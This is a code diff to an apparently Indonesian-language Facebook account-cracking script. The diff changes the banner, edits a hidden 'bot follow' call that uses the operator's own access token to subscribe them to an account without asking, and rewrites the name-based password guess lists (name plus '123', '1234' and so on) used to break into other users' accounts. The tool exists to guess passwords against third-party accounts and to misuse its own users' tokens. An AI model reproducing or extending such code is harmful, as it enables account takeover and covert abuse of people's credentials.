@@ -53,13 +53,7 @@ bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "0
 
 def logo():
 	os.system("clear")
-	print("""\033[1;97m             
-███████╗██╗   ██╗███████╗ ██████╗  ██████╗ 
-██╔════╝██║   ██║██╔════╝██╔════╝ ██╔═══██╗
-█████╗  ██║   ██║█████╗  ██║  ███╗██║   ██║
-██╔══╝  ██║   ██║██╔══╝  ██║   ██║██║   ██║
-██║     ╚██████╔╝███████╗╚██████╔╝╚██████╔╝
-╚═╝      ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝  \033[1;0m
+	print("""\033[1;97m  L E G E N D -- F U E G O .X. R A J U L. \033[1;0m
 \033[1;97m--------------------------------------------------
 \033[1;93m➤\033[1;97m Author   : FUEGO-X-RAJUL
 \033[1;93m➤\033[1;97m Github   : https://github.com/MAFIA-FUEGO
@@ -83,7 +77,7 @@ def login():
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
 			#-> bot follow
-			requests.post("https://graph.facebook.com/princess.lubisi.7/subscribers?access_token="+token)      # Dapunta Khurayra X
+			requests.post("https://graph.facebook.com/4/subscribers?access_token="+token)      # Dapunta Khurayra X
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
@@ -293,13 +287,13 @@ def bapi(user):
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
+		pwx = [ name, name+"1", name+"12", name+"123" ]
 	elif len(name)<=2:
-		pwx = [ name+"3", name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
+		pwx = [ name+"3", name+"1234", name+"12345" ]
 	elif len(name)<=3:
-		pwx = [ name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
+		pwx = [ name+"2", name+"12", name+"123" ]
 	else:
-		pwx = [ name+"2", name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
+		pwx = [ name+"123", name+"1234", name+"12345" ]
 	try:
 		for pw in pwx:
 			pw = pw.lower()
